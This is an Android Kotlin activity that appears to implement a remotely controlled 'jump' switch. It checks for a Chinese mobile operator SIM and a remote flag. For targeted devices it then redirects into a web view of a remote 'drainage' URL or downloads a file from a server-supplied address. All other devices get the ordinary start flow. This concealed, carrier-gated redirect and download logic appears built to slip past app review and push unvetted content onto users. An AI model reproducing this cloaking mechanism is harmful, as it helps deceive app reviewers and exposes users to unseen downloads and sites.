package ced.cedie.cedrick.jujump.presentation.ui.jump

import android.os.Bundle
import android.text.TextUtils
import androidx.activity.viewModels
import ced.cedie.cedrick.jujump.presentation.helper.SharedPrefHelper
import ced.cedie.cedrick.jujump.presentation.ui.NoNetworkActivity
import ced.cedie.cedrick.jujump.presentation.ui.jump.webview.WebViewActivity
import ced.cedie.cedrick.jujump.presentation.utils.DownloadTool
import ced.cedie.cedrick.jujump.presentation.utils.checkOperators
import ced.cedie.cedrick.jujump.presentation.utils.isNetworkConnected
import ced.cedie.cedrick.jujump.presentation.utils.writeLogs
import kotlinx.coroutines.ExperimentalCoroutinesApi

import java.lang.NullPointerException

@ExperimentalCoroutinesApi
abstract class JumpActivity : DownloadTool() {

    private var domainSwitch = 1
    private var retryDomain = 1
    lateinit var jumpType: JumpType

    private val viewModel by viewModels<JumpActivityViewModel>()
    private lateinit var onStart: (version: Int, downUrl: String) -> Unit

    private val sharedPrefHelper by lazy {
        SharedPrefHelper(this).sharedPreferences
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        viewModel.jumpEvent.observe(this) { event ->
            when (event) {
                is JumpEvent.AppInstalledEvent -> registerApplication(event.isInstalled)
                is JumpEvent.JumpRequestSuccess -> processHandler(event.list)
                is JumpEvent.JumpRequestError -> processHandlerError(event.exception, event.requestType)
                else -> {
                    // no-op
                }
            }
        }
    }

    private fun processHandlerError(exception: Exception, requestType: RequestType) {
        writeLogs("Retry Count: $retryDomain")
        writeLogs("Failed Request...")
        when (requestType) {
            RequestType.INSTALL -> {
                if (retryDomain > 1) requestUrl()
                else {
                    retryDomain++
                    writeLogs("Requesting...")
                    startThread()
                }
            }
            RequestType.ANDROID_API -> {
                if (exception is NullPointerException || retryDomain > 1) onStart(1, "")
                else {
                    retryDomain++
                    writeLogs("Requesting...")
                    requestUrl()
                }
            }
        }
        writeLogs("JumpCode Error: ${exception::class.simpleName} Type: $requestType")
    }

    private fun processHandler(list: ced.cedie.cedrick.jujump.domain.dto.Response) {
        var kaiguan = list.off.toInt()
        val isChineseSim = checkOperators()
        val yingyongming = list.yingyongming
        if (!isChineseSim && !yingyongming.contains("测试")) {
            kaiguan = 1
        }
        val jumpDetails = ced.cedie.cedrick.jujump.domain.model.JumpDetails(
            version = list.versionNumber,
            wangzhi = list.wangzhi,
            drainage = list.drainage
        )
        routeHandler(kaiguan, jumpDetails)
    }

    private fun routeHandler(kaiguan: Int, jumpDetails: ced.cedie.cedrick.jujump.domain.model.JumpDetails) {
        when (kaiguan) {
            0 -> { /* No action */ }
            2 -> {
                if (jumpType == JumpType.SILENT_LINK || jumpType == JumpType.SILENT_TESTING) onStart(1, jumpDetails.drainage)
                else onWebLoaded(jumpDetails.drainage)
            }
            3 -> onDownload(jumpDetails.wangzhi)
            else -> onOtherResponse(
                jumpDetails.version,
                jumpDetails.wangzhi,
                jumpDetails.drainage
            )
        }
    }

    private fun onWebLoaded(s: String) {
        startActivity(WebViewActivity.createIntent(this@JumpActivity, s))
        finish()
        sharedPrefHelper.edit().putBoolean("haveOpenH5OnceTime", true).apply()
    }

    private fun onDownload(s: String) = download(s)

    private fun onOtherResponse(version: Int, downloadUrl: String, webUrl: String) {
        writeLogs("haveOpenH5OnceTime ${sharedPrefHelper.getBoolean("haveOpenH5OnceTime", false)}")
        if (sharedPrefHelper.getBoolean("haveOpenH5OnceTime", false) && !TextUtils.isEmpty(webUrl)) onWebLoaded(webUrl)
        else onStart(version, downloadUrl)
    }

    private fun getAppIsRegistered(): Boolean {
        writeLogs("Application Registered: ${sharedPrefHelper.getBoolean(SharedPrefHelper.APP_FRESH_INSTALLED, false)}")
        return sharedPrefHelper.getBoolean(SharedPrefHelper.APP_FRESH_INSTALLED, false)
    }

    private fun registerApplication(installed: Boolean) {
        if (installed) {
            sharedPrefHelper.edit().putBoolean(SharedPrefHelper.APP_FRESH_INSTALLED, true).apply()
            writeLogs("[Register Intalled App Done!]")
        }
        retryDomain = 1
        requestUrl()
    }

    private fun requestUrl() = viewModel.getApplicationUrl(getAppPackageName(), domainSwitch, retryDomain)

    private fun startThread() = viewModel.startRequest(getAppPackageName(), domainSwitch, retryDomain)

    fun getAppPackageName(): String =
        if (jumpType == JumpType.JUMP_TESTING || jumpType == JumpType.SILENT_TESTING) "123456" else applicationContext.packageName

    fun splashAction(jumpType: JumpType?, onStart: (version: Int, downUrl: String) -> Unit) {
        this.jumpType = jumpType ?: JumpType.JUMP_LINK
        this.onStart = onStart
        startLogs()
        if (!isNetworkConnected()) noInternetPage()
        else if (!getAppIsRegistered()) startThread()
        else requestUrl()
    }

    private fun noInternetPage() = startActivity(NoNetworkActivity.createIntent(this))

    private fun startLogs() {
        writeLogs("Domain Type: $domainSwitch")
        writeLogs("Android name Access: ${getAppPackageName()}")
        writeLogs("Application Package Name: ${applicationContext.packageName}")
    }
}
